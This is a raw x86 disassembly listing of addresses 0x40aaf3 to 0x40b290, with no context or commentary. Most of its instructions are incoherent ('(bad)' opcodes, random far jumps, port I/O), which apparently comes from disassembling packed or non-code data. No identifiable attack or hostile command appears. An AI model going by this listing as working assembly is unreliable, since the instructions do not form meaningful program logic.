  40aaf3:	outs   dx,BYTE PTR ds:[esi]
  40aaf4:	aam    0xac
  40aaf6:	xchg   ebx,eax
  40aaf7:	lds    edi,FWORD PTR [edx]
  40aaf9:	test   al,0x27
  40aafb:	retf   0x5b50
  40aafe:	adc    BYTE PTR [edx-0x32],bh
  40ab01:	sbb    DWORD PTR [edx-0x70],ebp
  40ab04:	mov    es,edx
  40ab06:	(bad)  
  40ab07:	jmp    0x3d3fa1a6
  40ab0c:	clc    
  40ab0d:	push   edx
  40ab0e:	loope  0x40ab4a
  40ab10:	fst    DWORD PTR [ebp+esi*2+0x2aaac5cc]
  40ab17:	xor    esi,ebx
  40ab19:	cmp    DWORD PTR [esi+0x60],0x99589553
  40ab20:	fwait
  40ab21:	mov    DWORD PTR [esi+ecx*8+0x68f15b03],edi
  40ab28:	loope  0x40ab15
  40ab2a:	dec    eax
  40ab2b:	je     0x40aba6
  40ab2d:	jg     0x40aaf4
  40ab2f:	retf   
  40ab30:	adc    BYTE PTR [esi+0x53],cl
  40ab33:	jne    0x40ab02
  40ab35:	cmp    esp,DWORD PTR [esi]
  40ab37:	out    0x77,eax
  40ab39:	and    bl,BYTE PTR [ebx-0x20]
  40ab3c:	xchg   edx,eax
  40ab3d:	or     al,0xd1
  40ab3f:	jo     0x40aad4
  40ab41:	int3   
  40ab42:	adc    BYTE PTR [esi-0x3f0fb434],dl
  40ab48:	mov    bp,0xb870
  40ab4c:	xor    DWORD PTR [ecx+0x3d],edx
  40ab4f:	jl     0x40ab8a
  40ab51:	or     BYTE PTR [edi+esi*8],ah
  40ab54:	dec    ebp
  40ab55:	addr16 std 
  40ab57:	pop    esi
  40ab58:	stos   BYTE PTR es:[edi],al
  40ab59:	inc    esp
  40ab5a:	sti    
  40ab5b:	pop    esp
  40ab5c:	push   0x26d9b756
  40ab61:	mov    al,0x14
  40ab63:	dec    esp
  40ab64:	into   
  40ab65:	add    BYTE PTR ds:0xe240e80a,bl
  40ab6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab6c:	adc    BYTE PTR [esi],bl
  40ab6e:	xor    BYTE PTR [ebx],0x7d
  40ab71:	mov    edx,0x516e5a82
  40ab76:	pop    ecx
  40ab77:	aam    0x6f
  40ab79:	sub    BYTE PTR [ebp+0x6446da98],dl
  40ab7f:	mov    ebx,0xe29d59aa
  40ab84:	push   0xf7387ca8
  40ab89:	adc    al,0x5f
  40ab8b:	ror    BYTE PTR [eax-0x3],cl
  40ab8e:	dec    ebp
  40ab8f:	addr16 push ebx
  40ab91:	xchg   bl,ah
  40ab93:	hlt    
  40ab94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab95:	stos   BYTE PTR es:[edi],al
  40ab96:	stos   BYTE PTR es:[edi],al
  40ab97:	push   0x734a265e
  40ab9c:	cmp    BYTE PTR [ebx+ebx*8+0x3d0174bd],dl
  40aba3:	stos   DWORD PTR es:[edi],eax
  40aba4:	stos   DWORD PTR es:[edi],eax
  40aba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aba6:	mov    dl,0xf2
  40aba8:	nop
  40aba9:	sbb    al,0x58
  40abab:	inc    edx
  40abac:	jmp    0xc693:0x9d6ba52e
  40abb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abb4:	mov    bl,0x74
  40abb6:	mov    esi,0xb3154499
  40abbb:	loop   0x40ab5c
  40abbd:	pop    eax
  40abbe:	jmp    0x8c3e:0x2953bf5
  40abc5:	cmp    dh,BYTE PTR [ebx-0x1f585a02]
  40abcb:	data16 xor ah,bh
  40abce:	scas   al,BYTE PTR es:[edi]
  40abcf:	ret    
  40abd0:	(bad)  
  40abd1:	fmul   DWORD PTR [esi]
  40abd3:	pop    ss
  40abd4:	aam    0x5
  40abd6:	mov    eax,ds:0x8ea148a
  40abdb:	cmp    esp,DWORD PTR [edx+0x43]
  40abde:	scas   al,BYTE PTR es:[edi]
  40abdf:	stos   DWORD PTR es:[edi],eax
  40abe0:	and    bh,bh
  40abe2:	ins    BYTE PTR es:[edi],dx
  40abe3:	mov    esi,0xcbc088ae
  40abe8:	and    BYTE PTR [esi],bl
  40abea:	out    dx,al
  40abeb:	fistp  QWORD PTR [ecx]
  40abed:	mov    esp,0x6b29fa62
  40abf2:	out    0xf0,eax
  40abf4:	test   BYTE PTR [ebp+0x166790ae],dh
  40abfa:	mov    ch,0x5c
  40abfc:	dec    eax
  40abfd:	shl    BYTE PTR [ecx-0x4b],0x3
  40ac01:	dec    ebp
  40ac02:	sub    ebp,DWORD PTR [ecx-0x43b0f669]
  40ac08:	call   0x7c67:0xf225b88
  40ac0f:	jbe    0x40ac43
  40ac11:	jmp    0xbf19:0x45df1132
  40ac18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac19:	and    ebp,DWORD PTR [edx+ebx*4-0x27]
  40ac1d:	std    
  40ac1e:	xchg   ebx,eax
  40ac1f:	out    dx,al
  40ac20:	sti    
  40ac21:	loop   0x40ac83
  40ac23:	cmp    bl,dh
  40ac25:	or     BYTE PTR [edi+0x3a],cl
  40ac28:	daa    
  40ac29:	push   ecx
  40ac2a:	sbb    DWORD PTR [edi+0x53a09ba7],eax
  40ac30:	and    DWORD PTR [edx+0x73],esi
  40ac33:	int3   
  40ac34:	aam    0x55
  40ac36:	retf   0x290e
  40ac39:	mov    ds:0x87c6ff62,al
  40ac3e:	inc    ecx
  40ac3f:	sub    edi,0xc3581b48
  40ac45:	imul   eax,DWORD PTR [eax+0x64],0x33
  40ac49:	dec    ecx
  40ac4a:	les    ecx,FWORD PTR [eax*4-0xca25c2]
  40ac51:	adc    al,ch
  40ac53:	sbb    eax,0xd83304c9
  40ac58:	push   0xfffffffb
  40ac5a:	sbb    dl,BYTE PTR [esi+0x7ee93822]
  40ac60:	nop
  40ac61:	inc    edi
  40ac62:	test   DWORD PTR [edi+0x12c75748],ecx
  40ac68:	retf   0xda50
  40ac6b:	leave  
  40ac6c:	in     al,0xb9
  40ac6e:	les    esi,FWORD PTR [edx+0x59]
  40ac71:	xor    ebx,DWORD PTR [edx+0x2d]
  40ac74:	lods   eax,DWORD PTR ds:[esi]
  40ac75:	lods   al,BYTE PTR ds:[esi]
  40ac76:	or     DWORD PTR [edi-0x4a],0xffffffb3
  40ac7a:	xlat   BYTE PTR ds:[ebx]
  40ac7b:	stos   BYTE PTR es:[edi],al
  40ac7c:	jns    0x40ac48
  40ac7e:	sbb    eax,0xa4cf43a7
  40ac83:	mov    eax,DWORD PTR [ebx-0x21]
  40ac86:	pop    ds
  40ac87:	adc    al,0xcc
  40ac89:	fisttp QWORD PTR [edx-0x6a]
  40ac8c:	dec    ebx
  40ac8d:	xchg   esi,eax
  40ac8e:	fwait
  40ac8f:	sub    edx,esi
  40ac91:	push   edi
  40ac92:	in     eax,0xb7
  40ac94:	lods   eax,DWORD PTR ds:[esi]
  40ac95:	xchg   ecx,eax
  40ac96:	imul   edi,DWORD PTR [ebx-0x5e],0xb96b0ad8
  40ac9d:	(bad)  
  40ac9f:	ja     0x40ad03
  40aca1:	sub    al,0xfb
  40aca3:	clc    
  40aca4:	sbb    al,BYTE PTR [edi+edx*4]
  40aca7:	pop    ds
  40aca8:	jl     0x40ac6f
  40acaa:	outs   dx,DWORD PTR ds:[esi]
  40acab:	inc    ecx
  40acac:	test   al,0x6c
  40acae:	adc    ch,BYTE PTR [ebx+0x76]
  40acb1:	cmp    eax,0x2dfba294
  40acb6:	cdq    
  40acb7:	cmp    al,0x3b
  40acb9:	jg     0x40ac77
  40acbb:	addr16 cmc 
  40acbd:	lahf   
  40acbe:	sar    DWORD PTR [edi+0xf],1
  40acc1:	or     esp,DWORD PTR [edx+0x39]
  40acc4:	sub    ch,BYTE PTR [ebx+0x167271cf]
  40acca:	xchg   BYTE PTR [ebp+0x73],bh
  40accd:	sub    DWORD PTR [ecx-0x1732e593],edi
  40acd3:	push   ss
  40acd4:	xor    BYTE PTR [eax],al
  40acd6:	pop    ebp
  40acd7:	fcmovnu st,st(1)
  40acd9:	xchg   ebp,ecx
  40acdb:	hlt    
  40acdc:	push   edx
  40acdd:	pop    edx
  40acde:	pop    edi
  40acdf:	pop    ebp
  40ace0:	nop
  40ace1:	sbb    DWORD PTR [ecx-0x3c],esi
  40ace4:	xor    eax,0x3baf3751
  40ace9:	in     al,0x85
  40aceb:	ror    DWORD PTR [edx+0x68fc9d2f],0x15
  40acf2:	push   ecx
  40acf3:	mov    edx,0x21d07824
  40acf8:	stos   BYTE PTR es:[edi],al
  40acf9:	lods   al,BYTE PTR ds:[esi]
  40acfa:	push   ss
  40acfb:	jb     0x40ac8c
  40acfd:	in     eax,0xf9
  40acff:	mov    edi,DWORD PTR [eax+0x66]
  40ad02:	pop    edi
  40ad03:	sbb    eax,0x3522c748
  40ad08:	das    
  40ad09:	std    
  40ad0a:	or     DWORD PTR [esi],ebx
  40ad0c:	(bad)  
  40ad0d:	sbb    al,BYTE PTR [edi+0x4f]
  40ad10:	push   eax
  40ad11:	out    dx,al
  40ad12:	sbb    ch,BYTE PTR [eax-0x36a55cb5]
  40ad18:	push   es
  40ad19:	mov    ebx,0xdc7662f9
  40ad1e:	cwde   
  40ad1f:	add    esi,DWORD PTR [eax-0x2b9f8344]
  40ad25:	scas   al,BYTE PTR es:[edi]
  40ad26:	lea    edx,[edi+0x38]
  40ad29:	inc    eax
  40ad2a:	iret   
  40ad2b:	jmp    0x31eb0776
  40ad30:	bound  eax,QWORD PTR [eax]
  40ad32:	or     BYTE PTR [ebx+0x4d8ba045],cl
  40ad38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad39:	shrd   eax,ecx,0x2
  40ad3d:	shr    ecx,0x2
  40ad40:	mov    ecx,DWORD PTR [ebp-0x60]
  40ad43:	mov    edx,DWORD PTR [ebp-0x5c]
  40ad46:	jmp    0x40b2d0
  40ad4b:	dec    ebx
  40ad4c:	adc    BYTE PTR [edi+0x4d],bl
  40ad4f:	adc    eax,0x89101919
  40ad54:	xchg   ebx,eax
  40ad55:	inc    esi
  40ad56:	mov    ah,0xe3
  40ad58:	push   eax
  40ad59:	jmp    0x40ad0f
  40ad5b:	lea    ecx,[ecx]
  40ad5d:	push   ss
  40ad5e:	push   ss
  40ad5f:	cmp    eax,0x88161604
  40ad64:	jmp    0xc38f:0x355be5b4
  40ad6b:	cmp    DWORD PTR [ebp-0x40c05db8],ecx
  40ad71:	sub    ecx,ebx
  40ad73:	mov    dl,0xb9
  40ad75:	push   ebp
  40ad76:	xor    bl,BYTE PTR [ebx+0x6]
  40ad79:	(bad)  
  40ad7a:	hlt    
  40ad7b:	popa   
  40ad7c:	inc    ebp
  40ad7d:	xor    ch,BYTE PTR [edx+0x69]
  40ad80:	test   eax,0xcfdc944
  40ad85:	outs   dx,DWORD PTR ds:[esi]
  40ad86:	xor    DWORD PTR [eax+0x4f01da1c],ebp
  40ad8c:	jmp    0xa435:0xd8af94ae
  40ad93:	je     0x40adf3
  40ad95:	mov    bh,0xc8
  40ad97:	inc    edx
  40ad98:	daa    
  40ad99:	xchg   esi,eax
  40ad9a:	and    eax,0x83a21a6f
  40ad9f:	retf   
  40ada0:	fwait
  40ada1:	les    esp,FWORD PTR [edi]
  40ada3:	jne    0x40adce
  40ada5:	jae    0x40ae0f
  40ada7:	or     eax,edx
  40ada9:	jmp    0x242:0xa887f9a6
  40adb0:	iret   
  40adb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adb2:	outs   dx,DWORD PTR ds:[esi]
  40adb3:	jb     0x40ad47
  40adb5:	mov    ah,0x28
  40adb7:	jno    0x40adbf
  40adb9:	sbb    eax,0x4c3dad4d
  40adbe:	sbb    cl,bl
  40adc0:	ins    DWORD PTR es:[edi],dx
  40adc1:	mov    esi,0xbf15b499
  40adc6:	pop    esi
  40adc7:	ds push ebp
  40adc9:	outs   dx,DWORD PTR ds:[esi]
  40adca:	cmp    BYTE PTR [eax],ch
  40adcc:	mov    eax,0x94864d5b
  40add1:	sbb    cl,BYTE PTR [eax-0x21]
  40add4:	lds    ebx,FWORD PTR [esi+0x1540a194]
  40adda:	sub    eax,0x9953592c
  40addf:	loope  0x40adb5
  40ade1:	push   edi
  40ade2:	xchg   edx,eax
  40ade3:	out    dx,al
  40ade4:	jle    0x40adc2
  40ade6:	and    eax,0xb1fc8a56
  40adeb:	shl    BYTE PTR [ecx+0xe],cl
  40adee:	pushf  
  40adef:	scas   ax,WORD PTR es:[edi]
  40adf1:	jo     0x40ae4e
  40adf3:	push   es
  40adf4:	lea    ecx,[ecx+0x2e]
  40adf7:	jg     0x40adb8
  40adf9:	cmp    ecx,DWORD PTR [edx]
  40adfb:	sbb    DWORD PTR [esi+eiz*2],ecx
  40adfe:	sbb    bh,BYTE PTR fs:0x238f14aa
  40ae05:	shl    dl,0x2b
  40ae08:	cmp    eax,0xa6326de6
  40ae0d:	clc    
  40ae0e:	xor    BYTE PTR [edx],cl
  40ae10:	add    esp,esi
  40ae12:	int    0x34
  40ae14:	ins    DWORD PTR es:[edi],dx
  40ae15:	xlat   BYTE PTR ds:[ebx]
  40ae16:	pop    esi
  40ae17:	jle    0x40ae1c
  40ae19:	(bad)  
  40ae1a:	pop    ecx
  40ae1b:	js     0x40ae4a
  40ae1d:	cwde   
  40ae1e:	sti    
  40ae1f:	jb     0x40ae9e
  40ae21:	(bad)  
  40ae22:	(bad)  
  40ae23:	das    
  40ae24:	mov    al,ds:0xb02b1e79
  40ae29:	pop    ecx
  40ae2a:	(bad)  [edi]
  40ae2c:	loop   0x40ae60
  40ae2e:	push   ebx
  40ae2f:	enter  0xa717,0x9b
  40ae33:	pop    ebx
  40ae34:	jbe    0x40ae3a
  40ae36:	sub    eax,0x5afe2d0d
  40ae3b:	je     0x40add0
  40ae3d:	mov    ah,0x9e
  40ae3f:	sub    DWORD PTR [ebp+0x15af9a2a],eax
  40ae45:	sub    DWORD PTR [ecx-0x6a],ecx
  40ae48:	or     ah,BYTE PTR [edx-0x5eacf296]
  40ae4e:	(bad)  
  40ae4f:	jns    0x40ae21
  40ae51:	sub    al,BYTE PTR [ebx]
  40ae53:	(bad)  
  40ae55:	fidiv  DWORD PTR ds:0xf89a923b
  40ae5b:	mov    al,0x4a
  40ae5d:	mov    ds:0x75043f8,al
  40ae62:	lods   al,BYTE PTR ds:[esi]
  40ae63:	jle    0x40aede
  40ae65:	dec    edi
  40ae66:	mov    ds:0x455449f9,eax
  40ae6b:	pop    edx
  40ae6c:	cmp    eax,0x9b2c3712
  40ae71:	mov    BYTE PTR [edx+0x69],al
  40ae74:	(bad)  
  40ae75:	xor    al,0xeb
  40ae77:	sbb    eax,0xdd67e853
  40ae7c:	sub    bh,BYTE PTR [esi-0x8]
  40ae7f:	adc    DWORD PTR [ecx*1+0x2decd7c1],esi
  40ae86:	jne    0x40ae6c
  40ae88:	aad    0xa4
  40ae8a:	pop    edi
  40ae8b:	xor    ebx,DWORD PTR [edx]
  40ae8d:	cmp    cl,cl
  40ae8f:	(bad)  
  40ae91:	adc    eax,0xd374ea6f
  40ae96:	addr16 into 
  40ae98:	xor    DWORD PTR [ebp+0xd],eax
  40ae9b:	inc    eax
  40ae9c:	jg     0x40aec5
  40ae9e:	jae    0x40ae9e
  40aea0:	out    dx,eax
  40aea1:	aam    0x5
  40aea3:	xor    cl,ch
  40aea5:	sub    esp,esi
  40aea7:	xchg   DWORD PTR [ebp+ebx*1-0x18975d21],edi
  40aeae:	test   eax,0xa34a24cb
  40aeb3:	inc    esi
  40aeb4:	cwde   
  40aeb5:	xor    ebp,DWORD PTR [eax]
  40aeb7:	xor    ebp,esp
  40aeb9:	idiv   BYTE PTR [ebx+0x2a]
  40aebc:	dec    edx
  40aebd:	adc    DWORD PTR [eax+0x56c8c261],ebp
  40aec3:	call   0xe6716d94
  40aec8:	(bad)  
  40aec9:	(bad)  
  40aeca:	imul   ecx,DWORD PTR [ebp-0x38c2733b],0x7e
  40aed1:	loop   0x40aed4
  40aed3:	sub    eax,0xfa982f0a
  40aed8:	jbe    0x40af09
  40aeda:	retf   
  40aedb:	sub    ecx,DWORD PTR [ecx+0x6f6f3753]
  40aee1:	pop    esp
  40aee2:	mov    BYTE PTR [ebp-0x30776c50],al
  40aee8:	xchg   esi,eax
  40aee9:	fsub   QWORD PTR [edx+0xcfac181]
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	popf   
  40aef1:	dec    esi
  40aef2:	adc    ebp,DWORD PTR [ecx+0x1150f59f]
  40aef8:	lds    edx,FWORD PTR [edi+0x5d61502]
  40aefe:	loope  0x40af26
  40af00:	mov    DWORD PTR [eax-0x761e87c6],esi
  40af06:	repnz les esi,FWORD PTR [esi+0x684a6eb2]
  40af0d:	out    0xe1,al
  40af0f:	mov    ah,0x29
  40af11:	stos   BYTE PTR es:[edi],al
  40af12:	pushf  
  40af13:	mov    edx,ebp
  40af15:	ret    
  40af16:	pusha  
  40af17:	mov    edi,0xe8fe3b6c
  40af1c:	jecxz  0x40aeea
  40af1e:	jae    0x40af33
  40af20:	cmp    ebp,ecx
  40af22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af23:	cmp    DWORD PTR [eax],edi
  40af25:	ret    0x9b3
  40af28:	pop    ds
  40af29:	mov    cl,0x8e
  40af2b:	and    eax,0x89478b40
  40af30:	cwde   
  40af31:	jge    0x40af5b
  40af33:	sbb    al,0x79
  40af35:	add    al,0x2
  40af37:	sub    esp,esp
  40af39:	fdiv   DWORD PTR [ebx]
  40af3b:	add    edx,ecx
  40af3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af3e:	mov    ebp,DWORD PTR [ebx-0x48]
  40af41:	in     al,dx
  40af42:	jae    0x40afb5
  40af44:	add    DWORD PTR [ecx+0x40],eax
  40af47:	adc    eax,0xb2385414
  40af4c:	mov    edi,0x930ee5e7
  40af51:	pop    ss
  40af52:	out    0x4d,al
  40af54:	push   es
  40af55:	xchg   edx,eax
  40af56:	or     al,0xd0
  40af58:	or     eax,0x7bbdf0cf
  40af5d:	(bad)  
  40af5e:	mov    bh,0x70
  40af60:	pop    esp
  40af61:	jns    0xef74a1c4
  40af67:	xor    ch,BYTE PTR [ecx+0x54622459]
  40af6d:	mov    edx,?
  40af6f:	cs pop ecx
  40af71:	mov    esp,0x150f5408
  40af76:	mov    al,0xea
  40af78:	xchg   esi,eax
  40af79:	jge    0x40af2b
  40af7b:	or     eax,0xc75173a2
  40af80:	fcom   st(7)
  40af82:	imul   DWORD PTR [ecx-0x23]
  40af85:	adc    DWORD PTR [ebx-0x22713b17],esp
  40af8b:	out    dx,al
  40af8c:	inc    edi
  40af8d:	(bad)  
  40af8e:	daa    
  40af8f:	inc    edx
  40af90:	lea    ebp,[edi]
  40af92:	test   ebp,0x6b0a3c56
  40af98:	and    al,0x19
  40af9b:	xchg   DWORD PTR [esi+0x7c],ebx
  40af9e:	(bad)  
  40afa0:	cmc    
  40afa1:	push   eax
  40afa2:	add    BYTE PTR [edi+edx*2-0x1683af31],0x18
  40afaa:	jb     0x40afd7
  40afac:	pop    ss
  40afad:	mov    al,ds:0x17362831
  40afb2:	test   bh,0xf2
  40afb5:	push   ebx
  40afb6:	push   0xffffffa9
  40afb8:	repz or BYTE PTR [edx+edi*2+0x752ba10b],ch
  40afc0:	and    esi,ecx
  40afc2:	(bad)  
  40afc3:	iret   
  40afc4:	pop    ebx
  40afc5:	inc    ecx
  40afc6:	test   eax,0x986960b2
  40afcb:	jp     0x40af9c
  40afcd:	xor    ah,dl
  40afcf:	sbb    al,0x3c
  40afd1:	mov    ah,0x37
  40afd3:	repz jge 0x40b012
  40afd6:	sub    eax,0x2cc25ca8
  40afdb:	ss dec eax
  40afdd:	shl    ebp,cl
  40afdf:	hlt    
  40afe0:	pop    edx
  40afe1:	jno    0x40b031
  40afe3:	dec    esi
  40afe4:	ins    BYTE PTR es:[edi],dx
  40afe5:	in     al,0x7
  40afe7:	int3   
  40afe8:	ds pop ss
  40afea:	adc    DWORD PTR [esp+ebx*8-0x48],eax
  40afee:	or     eax,0x251fe0b2
  40aff3:	mov    eax,0xe0e5ffc2
  40aff8:	popf   
  40aff9:	mov    ds:0x6653eb13,al
  40affe:	inc    DWORD PTR [ecx+0x61]
  40b001:	(bad)  
  40b002:	out    0xa3,al
  40b004:	xor    cl,BYTE PTR [ebx]
  40b006:	retf   0x1673
  40b009:	mov    bl,0xad
  40b00b:	mov    bh,0xe6
  40b00d:	pop    ebp
  40b00e:	mov    cl,0xdc
  40b010:	in     eax,0xda
  40b012:	pusha  
  40b013:	out    dx,al
  40b014:	ret    0x8d43
  40b017:	fdivr  QWORD PTR [ebx]
  40b019:	push   ss
  40b01a:	test   al,0x84
  40b01d:	stos   DWORD PTR es:[edi],eax
  40b01e:	add    al,0x9
  40b020:	aaa    
  40b021:	loop   0x40b001
  40b023:	mov    ah,0xf
  40b025:	jb     0x40b05f
  40b027:	sub    al,0x3c
  40b029:	in     al,dx
  40b02a:	scas   al,BYTE PTR es:[edi]
  40b02b:	pop    esi
  40b02c:	imul   esp,DWORD PTR [ebp+0x43],0x1b
  40b030:	(bad)
  40b035:	push   ebx
  40b036:	nop
  40b037:	mov    es,WORD PTR [ecx+0x15]
  40b03a:	ja     0x40b054
  40b03c:	inc    edi
  40b03d:	add    eax,ecx
  40b03f:	outs   dx,BYTE PTR ds:[esi]
  40b040:	(bad)  
  40b041:	gs shl bh,1
  40b044:	jo     0x40affb
  40b046:	shr    DWORD PTR [edx+0x50],1
  40b049:	aad    0xdc
  40b04b:	imul   edi,DWORD PTR [ebx+0x2b],0xa48833ce
  40b052:	aaa    
  40b053:	lods   al,BYTE PTR ds:[esi]
  40b054:	mov    edx,0xf48a8758
  40b059:	adc    al,0xb1
  40b05b:	xchg   esi,eax
  40b05c:	jnp    0x40b063
  40b05e:	inc    edi
  40b05f:	not    BYTE PTR [edx]
  40b061:	jno    0x40afea
  40b063:	sub    al,0x0
  40b065:	mov    al,0xf0
  40b067:	mov    eax,ds:0xb390a3b0
  40b06c:	xchg   edx,eax
  40b06d:	loop   0x40b024
  40b06f:	add    al,0xc5
  40b071:	lods   eax,DWORD PTR ds:[esi]
  40b072:	test   bl,al
  40b074:	imul   esi,DWORD PTR [ecx+0x6257ad59],0xe
  40b07b:	push   cs
  40b07c:	mov    cl,0xb0
  40b07e:	clc    
  40b07f:	imul   edi,DWORD PTR [ebp-0x74c30d22],0xf897a9d5
  40b089:	fld    QWORD PTR [esi+0x5f]
  40b08c:	repz shl BYTE PTR es:[ebp-0x1],1
  40b091:	mov    esp,cr0
  40b094:	int3   
  40b095:	mov    eax,0x50a94f43
  40b09a:	nop
  40b09b:	jne    0x40b081
  40b09d:	dec    eax
  40b09e:	cli    
  40b09f:	fisubr WORD PTR [edi+0xc993f25]
  40b0a5:	push   esi
  40b0a6:	push   ebx
  40b0a7:	or     DWORD PTR [esi+0x1dd2ce9],0xdaa08ff0
  40b0b1:	and    BYTE PTR [eax+0x78a83bcb],0xc7
  40b0b8:	sub    BYTE PTR [edx],dh
  40b0ba:	xchg   esi,eax
  40b0bb:	fwait
  40b0bc:	push   edi
  40b0bd:	push   esi
  40b0be:	dec    esi
  40b0bf:	fwait
  40b0c0:	adc    eax,0xf6506466
  40b0c5:	sbb    eax,DWORD PTR [ebx+0x33a75657]
  40b0cb:	inc    esp
  40b0cc:	xor    DWORD PTR [ebp+0x5e],ebx
  40b0cf:	mov    al,0x57
  40b0d1:	sub    ecx,DWORD PTR [ecx+0x6b]
  40b0d4:	add    al,0x1c
  40b0d6:	addr16 mov al,0xb
  40b0d9:	sar    BYTE PTR [edi],1
  40b0db:	hlt    
  40b0dc:	jne    0x40b13c
  40b0de:	push   0x4
  40b0e0:	add    ch,BYTE PTR [ebp+0x39776073]
  40b0e6:	neg    BYTE PTR [edi-0x33]
  40b0e9:	fs pop esi
  40b0eb:	add    eax,0x2a71097e
  40b0f0:	cmc    
  40b0f1:	loopne 0x40b0e9
  40b0f3:	jmp    0xf0881c37
  40b0f8:	ss repnz xchg ebp,eax
  40b0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0fc:	inc    ebp
  40b0fd:	sub    DWORD PTR [ebp-0x5dae7ad4],0x74bbf48b
  40b107:	xchg   edi,eax
  40b108:	xor    esp,ebx
  40b10a:	or     al,0x45
  40b10c:	xor    BYTE PTR [edx-0x637ee512],al
  40b112:	pop    ebp
  40b113:	dec    DWORD PTR [eax+ecx*1-0x7]
  40b117:	sbb    eax,0x134bb858
  40b11c:	xchg   edx,eax
  40b11d:	ret    
  40b11e:	mov    eax,0x4cbf069
  40b123:	add    BYTE PTR [ebx-0xd],al
  40b126:	shl    DWORD PTR [ecx+ebp*4+0x7a],cl
  40b12a:	dec    edi
  40b12b:	int    0x6
  40b12d:	std    
  40b12e:	out    dx,al
  40b12f:	out    dx,eax
  40b130:	cmp    eax,ebp
  40b132:	repnz fnstcw WORD PTR [edi-0x68]
  40b136:	xchg   esp,eax
  40b137:	or     BYTE PTR [eax+ecx*1],al
  40b13a:	in     eax,dx
  40b13b:	test   al,0xc
  40b13d:	mov    cl,0x75
  40b13f:	call   0xa37c:0x2ac489bf
  40b146:	jmp    0x40b14c
  40b148:	repz dec ecx
  40b14a:	call   0x741f:0x1ad5d985
  40b151:	dec    ebp
  40b152:	(bad)  
  40b153:	jmp    0x47a7:0xed071e29
  40b15a:	rcl    BYTE PTR [ebx+0x18],1
  40b15d:	xchg   esp,eax
  40b15e:	push   esp
  40b15f:	mov    eax,0x60ab91b3
  40b164:	fadd   st,st(3)
  40b166:	pop    ebx
  40b167:	lea    ebx,[ecx]
  40b169:	xor    eax,0xe764bd88
  40b16e:	out    0x3e,al
  40b170:	aas    
  40b171:	cli    
  40b172:	and    eax,0x789379e2
  40b177:	xor    BYTE PTR ds:0xfeef74c2,bl
  40b17d:	pop    eax
  40b17e:	int    0x98
  40b180:	ins    DWORD PTR es:[edi],dx
  40b181:	xor    bh,ch
  40b183:	sbb    ch,BYTE PTR [ebp-0x6a]
  40b186:	into   
  40b187:	and    DWORD PTR [ecx],edi
  40b189:	pop    ecx
  40b18a:	ja     0x40b1ec
  40b18c:	mov    eax,ds:0xf4009974
  40b191:	lods   al,BYTE PTR ds:[esi]
  40b192:	imul   eax,DWORD PTR [edx+0x78],0x2cb98185
  40b199:	pop    ebx
  40b19a:	mov    eax,0x7571c362
  40b19f:	(bad)  [edx+0x5c]
  40b1a2:	out    dx,al
  40b1a3:	push   ebx
  40b1a4:	mov    edx,DWORD PTR [edx+0x4e21e227]
  40b1aa:	mov    ds:0xeb33d863,eax
  40b1af:	mov    esp,0xceed8b43
  40b1b4:	adc    bl,cl
  40b1b6:	leave  
  40b1b7:	nop
  40b1b8:	or     al,0xf1
  40b1ba:	lahf   
  40b1bb:	adc    BYTE PTR [ecx+0x74517511],al
  40b1c1:	nop
  40b1c2:	push   ebx
  40b1c3:	in     eax,dx
  40b1c4:	hlt    
  40b1c5:	xor    BYTE PTR [edx],ah
  40b1c7:	fimul  DWORD PTR [ebx+0xb]
  40b1ca:	mov    ds:0xeba67169,al
  40b1cf:	mov    eax,0x3d2e9505
  40b1d4:	jmp    0x47fd:0xbadfcbe6
  40b1db:	iret   
  40b1dc:	adc    DWORD PTR [esi+0x525a3c69],esi
  40b1e2:	fsub   DWORD PTR [ebx]
  40b1e4:	mov    ebx,DWORD PTR [ebp-0x1eeacaef]
  40b1ea:	cwde   
  40b1eb:	add    ebp,edi
  40b1ed:	outs   dx,DWORD PTR ds:[esi]
  40b1ee:	adc    eax,0xb6e18e50
  40b1f3:	pop    es
  40b1f4:	lds    esp,FWORD PTR es:[edx-0xd5eedfe]
  40b1fb:	cmp    al,0x6d
  40b1fd:	mov    esi,0xe00508e5
  40b202:	mov    edi,0xb2c48c7a
  40b207:	push   ebp
  40b208:	fsubrp st(6),st
  40b20a:	and    ebx,DWORD PTR [ecx+0x831c0aa]
  40b210:	fwait
  40b211:	lock dec dx
  40b214:	mov    edi,0xe3d0e6e1
  40b219:	xor    eax,0xee620117
  40b21e:	out    0x7f,eax
  40b220:	fwait
  40b221:	xor    ah,BYTE PTR [ecx+0xc]
  40b224:	xchg   edx,eax
  40b225:	lds    edi,FWORD PTR [esi+0x44]
  40b228:	mov    eax,ds:0x65117ebc
  40b22d:	das    
  40b22e:	pop    ebx
  40b22f:	and    DWORD PTR [edi+eax*8],ebp
  40b232:	fdivr  DWORD PTR [edi+0x109cb9d2]
  40b238:	and    eax,0xf9c82f54
  40b23d:	int    0xda
  40b23f:	cmp    eax,0x6d68023b
  40b244:	ss fcomp st(0)
  40b247:	outs   dx,BYTE PTR ds:[esi]
  40b248:	pop    ds
  40b249:	leave  
  40b24a:	sbb    al,0x9b
  40b24c:	in     eax,dx
  40b24d:	push   0xffffffaa
  40b24f:	push   0x971e1729
  40b254:	xor    ecx,DWORD PTR [edx-0x18dc88fc]
  40b25a:	add    BYTE PTR [esi-0x25],bh
  40b25d:	daa    
  40b25e:	in     eax,dx
  40b25f:	(bad)
  40b264:	sub    DWORD PTR [eax],0xffffff99
  40b267:	sub    eax,0x86dafbf2
  40b26d:	xchg   esp,eax
  40b26e:	sub    eax,0x157ed6c
  40b273:	jmp    0xcb38:0x26bcbfd5
  40b27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b27b:	mov    ebp,0x9b258a92
  40b280:	int    0x24
  40b282:	leave  
  40b283:	fisub  WORD PTR [esi]
  40b285:	les    edx,FWORD PTR [ebp+0x485ce9ce]
  40b28b:	push   edi
  40b28c:	enter  0xed2b,0xfa
  40b290:	pusha  
